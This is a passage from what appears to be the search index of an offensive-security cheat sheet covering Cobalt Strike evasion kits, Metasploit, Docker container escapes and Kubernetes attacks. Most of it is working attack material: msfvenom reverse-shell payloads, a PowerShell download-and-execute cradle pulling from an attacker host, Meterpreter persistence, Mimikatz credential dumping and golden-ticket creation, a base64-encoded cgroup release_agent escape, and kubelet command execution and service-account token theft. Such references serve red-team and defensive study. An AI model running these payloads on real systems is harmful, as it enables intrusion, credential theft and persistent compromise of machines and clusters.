4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :</p> <ul> <li>Download the artifact kit : <code>Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)</code></li> <li>Install the dependencies : <code>sudo apt-get install mingw-w64</code></li> <li>Edit the Artifact code<ul> <li>Change pipename strings</li> <li>Change <code>VirtualAlloc</code> in <code>patch.c</code>/<code>patch.exe</code>, e.g: HeapAlloc</li> <li>Change Import</li> </ul> </li> <li>Build the Artifact</li> <li>Cobalt Strike -&gt; Script Manager &gt; Load .cna</li> </ul>"},{"location":"command-control/cobalt-strike/#mimikatz-kit","title":"Mimikatz Kit","text":"<ul> <li>Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)</li> <li>Load the mimikatz.cna aggressor script</li> <li>Use mimikatz functions as normal</li> </ul>"},{"location":"command-control/cobalt-strike/#sleep-mask-kit","title":"Sleep Mask Kit","text":"<p>The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.</p> <p>Use the included <code>build.sh</code> or <code>build.bat</code> script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.</p>"},{"location":"command-control/cobalt-strike/#thread-stack-spoofer","title":"Thread Stack Spoofer","text":"<p>An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.</p> <p>Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option <code>artifactkit_stack_spoof</code> in the config file <code>arsenal_kit.config</code>.</p>"},{"location":"command-control/cobalt-strike/#beacon-object-files","title":"Beacon Object Files","text":"<p>A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs</p> <p>Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h</p> <ul> <li>Compile     <pre><code># To compile this with Visual Studio:\ncl.exe /c /GS- hello.c /Fohello.o\n\n# To compile this with x86 MinGW:\ni686-w64-mingw32-gcc -c hello.c -o hello.o\n\n# To compile this with x64 MinGW:\nx86_64-w64-mingw32-gcc -c hello.c -o hello.o\n</code></pre></li> <li>Execute: <code>inline-execute /path/to/hello.o</code></li> </ul>"},{"location":"command-control/cobalt-strike/#ntlm-relaying-via-cobalt-strike","title":"NTLM Relaying via Cobalt Strike","text":"<pre><code>beacon&gt; socks 1080\nkali&gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://&lt;IP_TARGET&gt;\nbeacon&gt; rportfwd_local 8445 &lt;IP_KALI&gt; 445\nbeacon&gt; upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon&gt; PortBender redirect 445 8445\n</code></pre>"},{"location":"command-control/cobalt-strike/#references","title":"References","text":"<ul> <li>Red Team Ops with Cobalt Strike (1 of 9): Operations</li> <li>Red Team Ops with Cobalt Strike (2 of 9): Infrastructure</li> <li>Red Team Ops with Cobalt Strike (3 of 9): C2</li> <li>Red Team Ops with Cobalt Strike (4 of 9): Weaponization</li> <li>Red Team Ops with Cobalt Strike (5 of 9): Initial Access</li> <li>Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation</li> <li>Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation</li> <li>Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement</li> <li>Red Team Ops with Cobalt Strike (9 of 9): Pivoting</li> <li>A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 </li> <li>Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019</li> <li>TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE \u2013 UB 2018 - NOV 25 2018</li> <li>Cobalt Strike - DNS Beacon</li> <li>How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017</li> <li>NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse</li> <li>Cobalt Strike - User Guide</li> <li>Cobalt Strike 4.6 - User Guide PDF</li> </ul>"},{"location":"command-control/metasploit/","title":"Metasploit","text":""},{"location":"command-control/metasploit/#summary","title":"Summary","text":"<ul> <li>Installation</li> <li>Sessions</li> <li>Background handler</li> <li>Meterpreter - Basic<ul> <li>Generate a meterpreter</li> <li>Meterpreter Webdelivery</li> <li>Get System</li> <li>Persistence Startup</li> <li>Network Monitoring</li> <li>Portforward</li> <li>Upload / Download</li> <li>Execute from Memory</li> <li>Mimikatz</li> <li>Pass the Hash - PSExec</li> <li>Use SOCKS Proxy</li> </ul> </li> <li>Scripting Metasploit</li> <li>Multiple transports</li> <li>Best of - Exploits</li> <li>References</li> </ul>"},{"location":"command-control/metasploit/#installation","title":"Installation","text":"<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall\n</code></pre>"},{"location":"command-control/metasploit/#sessions","title":"Sessions","text":"<pre><code>CTRL+Z   -&gt; Session in Background\nsessions -&gt; List sessions\nsessions -i session_number -&gt; Interact with Session with id\nsessions -u session_number -&gt; Upgrade session to a meterpreter\nsessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&gt; Upgrade session to a meterpreter\n\nsessions -c cmd           -&gt; Execute a command on several sessions\nsessions -i 10-20 -c \"id\" -&gt; Execute a command on several sessions\n</code></pre>"},{"location":"command-control/metasploit/#background-handler","title":"Background handler","text":"<p>ExitOnSession : the handler will not exit if the meterpreter dies.</p> <pre><code>screen -dRR\nsudo msfconsole\n\nuse exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\n\ngenerate -o /tmp/meterpreter.exe -f exe\nto_handler\n\n[ctrl+a] + [d]\n</code></pre>"},{"location":"command-control/metasploit/#meterpreter-basic","title":"Meterpreter - Basic","text":""},{"location":"command-control/metasploit/#generate-a-meterpreter","title":"Generate a meterpreter","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.pl\n</code></pre>"},{"location":"command-control/metasploit/#meterpreter-webdelivery","title":"Meterpreter Webdelivery","text":"<p>Set up a Powershell web delivery listening on port 8080.</p> <pre><code>use exploit/multi/script/web_delivery\nset TARGET 2\nset payload windows/x64/meterpreter/reverse_http\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n</code></pre> <pre><code>powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');\n</code></pre>"},{"location":"command-control/metasploit/#get-system","title":"Get System","text":"<pre><code>meterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"command-control/metasploit/#persistence-startup","title":"Persistence Startup","text":"<pre><code>OPTIONS:\n\n-A        Automatically start a matching exploit/multi/handler to connect to the agent\n-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.\n-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.\n-S        Automatically start the agent on boot as a service (with SYSTEM privileges)\n-T &lt;opt&gt;  Alternate executable template to use\n-U        Automatically start the agent when the User logs on\n-X        Automatically start the agent when the system boots\n-h        This help menu\n-i &lt;opt&gt;  The interval in seconds between each connection attempt\n-p &lt;opt&gt;  The port on which the system running Metasploit is listening\n-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back\n\nmeterpreter &gt; run persistence -U -p 4242\n</code></pre>"},{"location":"command-control/metasploit/#network-monitoring","title":"Network Monitoring","text":"<pre><code># list interfaces\nrun packetrecorder -li\n\n# record interface n\u00b01\nrun packetrecorder -i 1\n</code></pre>"},{"location":"command-control/metasploit/#portforward","title":"Portforward","text":"<pre><code>portfwd add -l 7777 -r 172.17.0.2 -p 3006\n</code></pre>"},{"location":"command-control/metasploit/#upload-download","title":"Upload / Download","text":"<pre><code>upload /path/in/hdd/payload.exe exploit.exe\ndownload /path/in/victim\n</code></pre>"},{"location":"command-control/metasploit/#execute-from-memory","title":"Execute from Memory","text":"<pre><code>execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w\n</code></pre>"},{"location":"command-control/metasploit/#mimikatz","title":"Mimikatz","text":"<pre><code>load mimikatz\nmimikatz_command -f version\nmimikatz_command -f samdump::hashes\nmimikatz_command -f sekurlsa::wdigest\nmimikatz_command -f sekurlsa::searchPasswords\nmimikatz_command -f sekurlsa::logonPasswords full\n</code></pre> <pre><code>load kiwi\ncreds_all\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\n</code></pre>"},{"location":"command-control/metasploit/#pass-the-hash-psexec","title":"Pass the Hash - PSExec","text":"<pre><code>msf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp\nmsf exploit(psexec) &gt; exploit\nSMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication\nSMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username\nSMBUser               Lambda                                                             no        The username to authenticate as\n</code></pre>"},{"location":"command-control/metasploit/#use-socks-proxy","title":"Use SOCKS Proxy","text":"<pre><code>setg Proxies socks4:127.0.0.1:1080\n</code></pre>"},{"location":"command-control/metasploit/#scripting-metasploit","title":"Scripting Metasploit","text":"<p>Using a <code>.rc file</code>, write the commands to execute, then run <code>msfconsole -r ./file.rc</code>. Here is a simple example to script the deployment of a handler an create an Office doc with macro.</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 4646\nset ExitOnSession false\nexploit -j -z\n\n\nuse exploit/multi/fileformat/office_word_macro \nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 10.10.14.22\nset LPORT 4646\nexploit\n</code></pre>"},{"location":"command-control/metasploit/#multiple-transports","title":"Multiple transports","text":"<pre><code>msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;host&gt; lport=&lt;port&gt; sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe\n</code></pre> <p>Then, in AddTransports.ps1</p> <pre><code>Add-TcpTransport -lhost &lt;host&gt; -lport &lt;port&gt; -RetryWait 10 -RetryTotal 30\nAdd-WebTransport -Url http(s)://&lt;host&gt;:&lt;port&gt;/&lt;luri&gt; -RetryWait 10 -RetryTotal 30\n</code></pre>"},{"location":"command-control/metasploit/#best-of-exploits","title":"Best of - Exploits","text":"<ul> <li>MS17-10 Eternal Blue - <code>exploit/windows/smb/ms17_010_eternalblue</code></li> <li>MS08_67 - <code>exploit/windows/smb/ms08_067_netapi</code></li> </ul>"},{"location":"command-control/metasploit/#references","title":"References","text":"<ul> <li>Multiple transports in a meterpreter payload - ionize</li> <li>Creating Metasploit Payloads - Peleus</li> </ul>"},{"location":"containers/docker/","title":"Docker","text":"<p>Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.</p>"},{"location":"containers/docker/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Mounted Docker Socket</li> <li>Open Docker API Port</li> <li>Insecure Docker Registry</li> <li>Exploit privileged container abusing the Linux cgroup v1<ul> <li>Abusing CAP_SYS_ADMIN capability</li> <li>Abusing coredumps and core_pattern</li> </ul> </li> <li>Breaking out of Docker via runC</li> <li>Breaking out of containers using a device file</li> <li>References</li> </ul>"},{"location":"containers/docker/#tools","title":"Tools","text":"<ul> <li>Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations     <pre><code>dockscan unix:///var/run/docker.sock\ndockscan -r html -o myreport -v tcp://example.com:5422\n</code></pre></li> <li>DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)     <pre><code>./deepce.sh \n./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce\n./deepce.sh --no-enumeration --exploit SOCK --shadow\n./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami&gt;/tmp/hacked\"\n</code></pre></li> </ul>"},{"location":"containers/docker/#mounted-docker-socket","title":"Mounted Docker Socket","text":"<p>Prerequisite: * Socker mounted as volume : <code>- \"/var/run/docker.sock:/var/run/docker.sock\"</code></p> <p>Usually found in <code>/var/run/docker.sock</code>, for example for Portainer.</p> <pre><code>curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json\ncurl -XPOST \u2013unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create\ncurl -XPOST \u2013unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start\n</code></pre> <p>Exploit using brompwnie/ed</p> <pre><code>root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        \n[+] Hunt dem Socks\n[+] Hunting Down UNIX Domain Sockets from: /var/run/\n[*] Valid Socket: /var/run/docker.sock\n[+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to Autopwn:  /var/run/docker.sock\n[*] Getting Docker client...\n[*] Successfully got Docker client...\n[+] Attempting to escape to host...\n[+] Attempting in TTY Mode\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\n/ # chroot /host &amp;&amp; clear\n/ # echo 'You are now on the underlying host'\nYou are now on the underlying host\n/ # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n</code></pre>"},{"location":"containers/docker/#open-docker-api-port","title":"Open Docker API Port","text":"<p>Prerequisite: * Docker runned with <code>-H tcp://0.0.0.0:XXXX</code></p> <pre><code>$ nmap -sCV 10.10.10.10 -p 2376\n2376/tcp open  docker  Docker 19.03.5\n| docker-version:\n|   Version: 19.03.5\n|   MinAPIVersion: 1.12\n</code></pre> <p>Mount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem in <code>/mnt</code>.</p> <pre><code>$ export DOCKER_HOST=tcp://10.10.10.10:2376\n$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash\nor\n$ docker -H  open.docker.socket:2375 ps\n$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash\nor \n$ curl -s \u2013insecure https://tls-opendocker.socket:2376/secrets | jq\n$ curl \u2013insecure -X POST -H \"Content-Type: application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}'\n</code></pre> <p>From there you can backdoor the filesystem by adding an ssh key in <code>/root/.ssh</code> or adding a new root user in <code>/etc/passwd</code>.</p>"},{"location":"containers/docker/#insecure-docker-registry","title":"Insecure Docker Registry","text":"<p>Docker Registry\u2019s fingerprint is <code>Docker-Distribution-Api-Version</code> header. Then connect to Registry API endpoint: <code>/v2/_catalog</code>.</p> <pre><code>curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list\ndocker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt;\n\n# connect to the endpoint and list image blobs\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest\n# download blobs\ncurl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' &gt; out.tar.gz\n# automated download\nhttps://github.com/NotSoSecure/docker_fetch/\npython /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local\n</code></pre> <p>Access a private registry and start a container with one of its image</p> <pre><code>docker login -u admin -p admin docker.registry.local\ndocker pull docker.registry.local/wordpress-image\ndocker run -it docker.registry.local/wordpress-image /bin/bash\n</code></pre> <p>Access a private registry using OAuth Token from Google</p> <pre><code>curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email\ncurl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \ndocker login -e &lt;email&gt; -u oauth2accesstoken -p \"&lt;access token&gt;\" https://gcr.io\n</code></pre>"},{"location":"containers/docker/#exploit-privileged-container-abusing-the-linux-cgroup-v1","title":"Exploit privileged container abusing the Linux cgroup v1","text":"<p>Prerequisite (at least one):   * <code>--privileged</code>  * <code>--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</code> flags.</p>"},{"location":"containers/docker/#abusing-cap_sys_admin-capability","title":"Abusing CAP_SYS_ADMIN capability","text":"<pre><code>docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo \"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\" | base64 -d | bash -'\n</code></pre> <p>Exploit breakdown :</p> <pre><code># On the host\ndocker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash\n\n# In the container\nmkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x\n\necho 1 &gt; /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent\n\necho '#!/bin/sh' &gt; /cmd\necho \"ps aux &gt; $host_path/output\" &gt;&gt; /cmd\nchmod a+x /cmd\n\nsh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"\n</code></pre>"},{"location":"containers/docker/#abusing-coredumps-and-core_pattern","title":"Abusing coredumps and core_pattern","text":"<ol> <li>Find the mounting point using <code>mount</code> <pre><code>$ mount | head -n 1\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)\n</code></pre></li> <li>Create an evil binary at the root of the filesystem: <code>cp /tmp/poc /poc</code></li> <li>Set the program to be executed on the coredumps     <pre><code>echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\" &gt; /proc/sys/kernel/core_pattern\n</code></pre></li> <li>Generate a coredump with a faulty program: <code>gcc -o crash crash.c &amp;&amp; ./crash</code> <pre><code>int main(void) {\n    char buf[1];\n    for (int i = 0; i &lt; 100; i++) {\n        buf[i] = 1;\n    }\n    return 0;\n}\n</code></pre></li> <li>Your payload should have been executed on the host</li> </ol>"},{"location":"containers/docker/#breaking-out-of-docker-via-runc","title":"Breaking out of Docker via runC","text":"<p>The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability overview by the runC team</p> <p>Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736</p> <pre><code>$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC\n$ docker run --rm cve-2019-5736:malicious_image_POC\n</code></pre>"},{"location":"containers/docker/#breaking-out-of-containers-using-a-device-file","title":"Breaking out of containers using a device file","text":"<pre><code>https://github.com/FSecureLABS/fdpasser\nIn container, as root: ./fdpasser recv /moo /etc/shadow\nOutside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \"sleep 1337\")/root/moo\nOutside container: ls -la /etc/shadow\nOutput: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow\n</code></pre>"},{"location":"containers/docker/#breaking-out-of-docker-via-kernel-modules-loading","title":"Breaking out of Docker via kernel modules loading","text":"<p>When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape.</p> <p>Exploitation: * Clone the repository : <code>git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping</code> * Build with <code>make</code> * Start a privileged docker container with <code>docker run -it --privileged --hostname docker --mount \"type=bind,src=$PWD,dst=/root\" ubuntu</code> * <code>cd /root</code> in the new container * Insert the kernel module with <code>./escape</code> * Run <code>./execute</code>!</p> <p>Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; <code>/proc/escape</code> and <code>/proc/output</code>.</p> <ul> <li><code>/proc/escape</code> only answers to write requests and simply executes anything that's passed to it via <code>call_usermodehelper()</code>.</li> <li><code>/proc/output</code> just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to.</li> </ul> <p>The clever part is that anything we write to <code>/proc/escape</code> gets sandwiched into <code>/bin/sh -c &lt;INPUT&gt; &gt; /proc/output</code>. This means that the command is run under <code>/bin/sh</code> and the output is redirected to <code>/proc/output</code>, which we can then read from within the container.</p> <p>Once the module is loaded, you can simply <code>echo \"cat /etc/passwd\" &gt; /proc/escape</code> and then get the result via <code>cat /proc/output</code>. Alternatively, you can use the <code>execute</code> program to give yourself a makeshift shell (albeit an extraordinarily basic one).</p> <p>The only caveat is that we cannot be sure that the container has <code>kmod</code> installed (which provides <code>insmod</code> and <code>rmmod</code>). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the <code>init_module()</code> syscall to load the module into the kernel without needing <code>insmod</code>. If you're interested, take a look at the Makefile.</p>"},{"location":"containers/docker/#references","title":"References","text":"<ul> <li>Hacking Docker Remotely - 17 March 2020 - ch0ks</li> <li>Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits</li> <li>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</li> <li>Breaking out of Docker via runC \u2013 Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019</li> <li>CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl</li> <li>OWASP - Docker Security CheatSheet</li> <li>Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017</li> <li>Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator</li> <li>Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer</li> </ul>"},{"location":"containers/kubernetes/","title":"Kubernetes","text":"<p>Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform designed to automate the deployment, scaling, and management of containerized applications</p>"},{"location":"containers/kubernetes/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploits<ul> <li>Accessible kubelet on 10250/TCP</li> <li>Obtaining Service Account Token</li> </ul> </li> <li>References</li> </ul>"},{"location":"containers/kubernetes/#tools","title":"Tools","text":"<ul> <li>BishopFox/badpods - A collection of manifests that will create pods with elevated privileges.     <pre><code>kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml\n</code></pre></li> <li>serain/kubelet-anon-rce - Executes commands in a container on a kubelet endpoint that allows anonymous authentication</li> <li>DataDog/KubeHound - Kubernetes Attack Graph     <pre><code># Critical paths enumeration\nkh.containers().criticalPaths().count()\nkh.containers().dedup().by(\"name\").criticalPaths().count()\nkh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()\nkh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()\nkh.endpoints(EndpointExposure.External).criticalPaths().count()\nkh.services().criticalPaths().count()\n\n# DNS services and port\nkh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)\n.dedup().valueMap(\"serviceDns\",\"port\")\n.group().by(\"serviceDns\").by(\"port\")\n</code></pre></li> </ul>"},{"location":"containers/kubernetes/#exploits","title":"Exploits","text":""},{"location":"containers/kubernetes/#accessible-kubelet-on-10250tcp","title":"Accessible kubelet on 10250/TCP","text":"<p>Requirements: * <code>--anonymous-auth</code>: Enables anonymous requests to the Kubelet server</p> <ul> <li>Getting pods: <code>curl -ks https://worker:10250/pods</code></li> <li>Run commands: <code>curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'</code></li> </ul>"},{"location":"containers/kubernetes/#obtaining-service-account-token","title":"Obtaining Service Account Token","text":"<p>Token is stored at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></p> <p>Use the service account token: * on <code>kube-apiserver</code> API: <code>curl -ks -H \"Authorization: Bearer &lt;TOKEN&gt;\" https://master:6443/api/v1/namespaces/{namespace}/secrets</code> * with kubectl: <code>kubectl --insecure-skip-tls-verify=true --server=\"https://master:6443\" --token=\"&lt;TOKEN&gt;\" get secrets 